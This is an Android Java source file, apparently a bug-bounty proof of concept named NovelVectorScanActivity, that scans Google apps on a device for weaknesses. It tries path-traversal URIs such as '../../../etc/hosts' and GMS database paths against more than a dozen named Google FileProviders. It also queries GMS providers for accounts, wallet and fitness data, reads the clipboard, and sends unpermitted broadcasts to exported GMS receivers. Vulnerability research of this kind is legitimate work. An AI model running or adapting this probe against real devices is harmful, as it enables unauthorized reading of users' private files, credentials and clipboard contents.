package com.vrp.poc;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ProviderInfo;
import android.content.pm.ResolveInfo;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.ParcelFileDescriptor;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.LinearLayout;
import android.widget.TextView;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.List;

public class NovelVectorScanActivity extends Activity {
    private static final String TAG = "NovelVectorScan";
    private TextView logView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(20, 20, 20, 20);
        logView = new TextView(this);
        logView.setTextSize(6);
        logView.setText("NOVEL VECTOR SCAN — FileProvider + openFile + URI grant\n");
        logView.append("UID: " + android.os.Process.myUid() + "\n\n");
        ll.addView(logView);
        sv.addView(ll);
        setContentView(sv);
        new Thread(this::runAllTests).start();
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        runOnUiThread(() -> logView.append(msg + "\n"));
    }

    private void runAllTests() {
        log("=== Phase 1: FileProvider Path Traversal ===\n");
        testFileProviderTraversal();

        log("\n=== Phase 2: Content Provider openFile() Traversal ===\n");
        testOpenFileTraversal();

        log("\n=== Phase 3: GMS Content Providers Deep Probe ===\n");
        testGmsProviders();

        log("\n=== Phase 4: Clipboard Provider Access ===\n");
        testClipboardAccess();

        log("\n=== Phase 5: Exported Broadcast Receivers ===\n");
        testBroadcastReceivers();

        log("\n=== Phase 6: Deep Link / App Link Hijacking ===\n");
        testDeepLinks();

        log("\n=== ALL NOVEL VECTOR TESTS COMPLETE ===");
    }

    private void testFileProviderTraversal() {
        String[][] providers = {
            {"com.google.android.apps.nbu.files.provider", "Google Files StorageLib"},
            {"com.google.android.apps.nbu.files.provider.cache", "Google Files Cache"},
            {"com.google.android.gms.common.fileprovider", "GMS Common FileProvider"},
            {"com.google.android.apps.photos.contentprovider", "Photos ContentProvider"},
            {"com.google.android.apps.docs.storage", "Drive Storage"},
            {"com.google.android.apps.docs.storage.legacy", "Drive Legacy"},
            {"com.google.android.apps.messaging.shared.datamodel.provider.attachment", "Messages Attachment"},
            {"com.google.android.apps.dynamite.fileprovider", "Chat FileProvider"},
            {"com.google.android.gm.fileprovider", "Gmail FileProvider"},
            {"com.google.android.keep.fileprovider", "Keep FileProvider"},
            {"com.google.android.apps.recorder.fileprovider", "Recorder FileProvider"},
            {"com.google.android.apps.walletnfcrel.fileprovider", "Wallet FileProvider"},
            {"com.google.android.apps.tachyon.fileprovider", "Duo/Meet FileProvider"},
            {"com.google.android.dialer.fileprovider", "Dialer FileProvider"},
        };

        String[] traversals = {
            "/",
            "/../../../etc/hosts",
            "/../../../data/data/com.google.android.gms/databases/",
            "/cache/../databases/",
            "/root/",
            "/../../../proc/self/maps",
            "/external_files/",
            "/cache/",
            "/files/",
        };

        for (String[] prov : providers) {
            for (String path : traversals) {
                Uri uri = Uri.parse("content://" + prov[0] + path);
                try {
                    InputStream is = getContentResolver().openInputStream(uri);
                    if (is != null) {
                        byte[] buf = new byte[256];
                        int read = is.read(buf);
                        is.close();
                        log("[TRAVERSAL-HIT!] " + prov[1] + " path=" + path);
                        log("  Read " + read + " bytes: " + bytesToHex(buf, Math.min(read, 64)));
                    }
                } catch (SecurityException e) {
                    // Expected - permission denied
                } catch (java.io.FileNotFoundException e) {
                    // Path not found - traversal blocked or file doesn't exist
                } catch (IllegalArgumentException e) {
                    String msg = e.getMessage();
                    if (msg != null && msg.contains("column")) {
                        // Column error, not interesting
                    } else if (msg != null) {
                        log("[TRAVERSAL-ERR] " + prov[1] + " path=" + path + ": " + shorten(msg, 60));
                    }
                } catch (Exception e) {
                    // Other errors
                }
            }

            // Also try query() to enumerate files
            try {
                Cursor c = getContentResolver().query(
                    Uri.parse("content://" + prov[0]),
                    null, null, null, null);
                if (c != null) {
                    log("[QUERY-OK] " + prov[1] + ": rows=" + c.getCount() +
                        " cols=" + c.getColumnCount());
                    if (c.getCount() > 0 && c.moveToFirst()) {
                        StringBuilder sb = new StringBuilder();
                        for (int i = 0; i < Math.min(c.getColumnCount(), 5); i++) {
                            if (i > 0) sb.append(", ");
                            try {
                                sb.append(c.getColumnName(i) + "=" + shorten(c.getString(i), 30));
                            } catch (Exception ex) {}
                        }
                        log("  First row: " + sb);
                    }
                    c.close();
                }
            } catch (SecurityException e) {
                // Expected
            } catch (Exception e) {
                // Not interesting
            }
        }
    }

    private void testOpenFileTraversal() {
        // Test content providers that implement openFile()
        String[][] targets = {
            {"content://com.google.android.gms/importexport/file", "GMS ImportExport"},
            {"content://com.google.android.gms.chimera.container.fileprovider/file", "GMS Chimera"},
            {"content://downloads/my_downloads", "Downloads"},
            {"content://downloads/all_downloads", "All Downloads"},
            {"content://downloads/public_downloads/1", "Public Download 1"},
            {"content://media/external/file/1", "Media File 1"},
            {"content://com.android.externalstorage.documents/document/primary%3A", "External Storage Root"},
            {"content://com.android.providers.downloads.documents/document/raw%3A%2Fstorage%2Femulated%2F0%2FDownload", "Downloads Doc"},
        };

        for (String[] target : targets) {
            // Try openInputStream
            try {
                InputStream is = getContentResolver().openInputStream(Uri.parse(target[0]));
                if (is != null) {
                    byte[] buf = new byte[256];
                    int read = is.read(buf);
                    is.close();
                    log("[OPENFILE-HIT!] " + target[1]);
                    log("  Read " + read + " bytes");
                }
            } catch (SecurityException e) {
                // Expected
            } catch (Exception e) {
                // Not interesting
            }

            // Try query
            try {
                Cursor c = getContentResolver().query(Uri.parse(target[0]), null, null, null, null);
                if (c != null) {
                    log("[OPENFILE-QUERY] " + target[1] + ": rows=" + c.getCount());
                    c.close();
                }
            } catch (SecurityException e) {
                // Expected
            } catch (Exception e) {
                // Not interesting
            }
        }
    }

    private void testGmsProviders() {
        // Deep probe GMS providers not tested before
        String[][] gmsProviders = {
            {"com.google.android.gms.phenotype", "Phenotype (Feature Flags)"},
            {"com.google.android.gms.nearby.sharing.provider", "Nearby Sharing"},
            {"com.google.android.gms.instantapps.supervisor", "Instant Apps"},
            {"com.google.android.gms.car.calendarcontentprovider", "Car Calendar"},
            {"com.google.android.gms.fitness.internal.fit_data_provider", "Fitness Data"},
            {"com.google.android.gms.auth.accounts", "Auth Accounts"},
            {"com.google.android.gms.fonts", "GMS Fonts"},
            {"com.google.android.gms.feedback.provider", "Feedback Provider"},
            {"com.google.android.gms.icing.provider", "Icing (Search Index)"},
            {"com.google.android.gms.measurement", "Firebase Analytics"},
            {"com.google.android.gms.mdm", "MDM Provider"},
            {"com.google.android.gms.people.provider", "People Provider"},
            {"com.google.android.gms.games.provider", "Games Provider"},
            {"com.google.android.gms.chimera.FileProvider", "Chimera FileProvider"},
            {"com.google.android.gms.wallet.provider", "Wallet Provider"},
        };

        for (String[] prov : gmsProviders) {
            try {
                Cursor c = getContentResolver().query(
                    Uri.parse("content://" + prov[0]),
                    null, null, null, null);
                if (c != null) {
                    int count = c.getCount();
                    int cols = c.getColumnCount();
                    StringBuilder sb = new StringBuilder();
                    sb.append("[GMS-PROVIDER] ").append(prov[1]).append(": rows=").append(count)
                      .append(" cols=").append(cols);
                    String[] colNames = c.getColumnNames();
                    sb.append(" [");
                    for (int i = 0; i < Math.min(cols, 8); i++) {
                        if (i > 0) sb.append(",");
                        sb.append(colNames[i]);
                    }
                    sb.append("]");
                    log(sb.toString());

                    if (count > 0 && c.moveToFirst()) {
                        for (int row = 0; row < Math.min(count, 3); row++) {
                            StringBuilder rowSb = new StringBuilder("  row" + row + ": ");
                            for (int i = 0; i < Math.min(cols, 5); i++) {
                                if (i > 0) rowSb.append(" | ");
                                try {
                                    rowSb.append(colNames[i]).append("=").append(shorten(c.getString(i), 40));
                                } catch (Exception ex) {
                                    rowSb.append(colNames[i]).append("=(blob)");
                                }
                            }
                            log(rowSb.toString());
                            if (!c.moveToNext()) break;
                        }
                    }
                    c.close();
                }
            } catch (SecurityException e) {
                // Expected
            } catch (Exception e) {
                String msg = e.getMessage();
                if (msg != null && msg.length() > 10) {
                    log("[GMS-ERR] " + prov[1] + ": " + shorten(msg, 50));
                }
            }
        }

        // Test Phenotype with specific packages (feature flags)
        log("\n--- Phenotype Feature Flag Probe ---");
        String[] phenoPackages = {
            "com.google.android.gms", "com.google.android.apps.photos",
            "com.google.android.gm", "com.google.android.apps.nbu.files"
        };
        for (String pkg : phenoPackages) {
            try {
                Cursor c = getContentResolver().query(
                    Uri.parse("content://com.google.android.gms.phenotype/" + pkg),
                    null, null, null, null);
                if (c != null) {
                    log("[PHENOTYPE] " + pkg + ": rows=" + c.getCount() +
                        " cols=" + c.getColumnCount());
                    if (c.getCount() > 0 && c.moveToFirst()) {
                        for (int i = 0; i < Math.min(c.getColumnCount(), 5); i++) {
                            try {
                                log("  " + c.getColumnName(i) + "=" + shorten(c.getString(i), 60));
                            } catch (Exception e) {}
                        }
                    }
                    c.close();
                }
            } catch (Exception e) {}
        }
    }

    private void testClipboardAccess() {
        // Test if we can access clipboard data programmatically
        try {
            android.content.ClipboardManager cm =
                (android.content.ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
            if (cm.hasPrimaryClip()) {
                android.content.ClipData clip = cm.getPrimaryClip();
                if (clip != null && clip.getItemCount() > 0) {
                    CharSequence text = clip.getItemAt(0).getText();
                    log("[CLIPBOARD] Has data: " + (text != null ? shorten(text.toString(), 40) : "(non-text)"));
                    Uri clipUri = clip.getItemAt(0).getUri();
                    if (clipUri != null) {
                        log("[CLIPBOARD-URI] " + clipUri);
                        try {
                            Cursor c = getContentResolver().query(clipUri, null, null, null, null);
                            if (c != null) {
                                log("[CLIPBOARD-URI-QUERY] rows=" + c.getCount());
                                c.close();
                            }
                        } catch (Exception e) {}
                    }
                }
            } else {
                log("[CLIPBOARD] Empty");
            }
        } catch (Exception e) {
            log("[CLIPBOARD-ERR] " + e.getClass().getSimpleName() + ": " + shorten(e.getMessage(), 50));
        }
    }

    private void testBroadcastReceivers() {
        // Test sending to exported broadcast receivers without permission
        String[][] receivers = {
            {"com.google.android.gms", "com.google.android.gms.analytics.AnalyticsReceiver", "com.google.android.gms.analytics.ANALYTICS_DISPATCH"},
            {"com.google.android.gms", "com.google.android.gms.measurement.AppMeasurementReceiver", "com.google.android.gms.measurement.UPLOAD"},
            {"com.google.android.gms", "com.google.android.gms.gcm.nts.TaskExecutionService", "com.google.android.gms.gcm.ACTION_TASK_READY"},
        };

        for (String[] recv : receivers) {
            try {
                Intent intent = new Intent(recv[2]);
                intent.setClassName(recv[0], recv[1]);
                sendBroadcast(intent);
                log("[BROADCAST-SENT] " + recv[1].substring(recv[1].lastIndexOf('.') + 1));
            } catch (Exception e) {
                log("[BROADCAST-ERR] " + recv[1].substring(recv[1].lastIndexOf('.') + 1) +
                    ": " + shorten(e.getMessage(), 50));
            }
        }
    }

    private void testDeepLinks() {
        // Find apps that handle specific URI schemes
        String[] testUrls = {
            "https://pay.google.com/",
            "https://photos.google.com/",
            "https://keep.google.com/",
            "https://docs.google.com/",
            "https://chat.google.com/",
            "https://meet.google.com/",
            "https://myaccount.google.com/",
            "googlehome://cast/",
            "intent://scan/#Intent;scheme=zxing;end",
        };

        PackageManager pm = getPackageManager();
        for (String url : testUrls) {
            try {
                Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
                List<ResolveInfo> resolvers = pm.queryIntentActivities(intent, PackageManager.MATCH_DEFAULT_ONLY);
                if (!resolvers.isEmpty()) {
                    StringBuilder sb = new StringBuilder("[DEEPLINK] " + url + " → ");
                    for (ResolveInfo ri : resolvers) {
                        sb.append(ri.activityInfo.packageName).append("/")
                          .append(ri.activityInfo.name.substring(ri.activityInfo.name.lastIndexOf('.') + 1))
                          .append(" ");
                    }
                    log(sb.toString());
                }
            } catch (Exception e) {}
        }
    }

    private String bytesToHex(byte[] bytes, int len) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < len; i++) {
            sb.append(String.format("%02x", bytes[i] & 0xff));
        }
        return sb.toString();
    }

    private String shorten(String s, int max) {
        if (s == null) return "null";
        return s.length() > max ? s.substring(0, max) + "..." : s;
    }
}
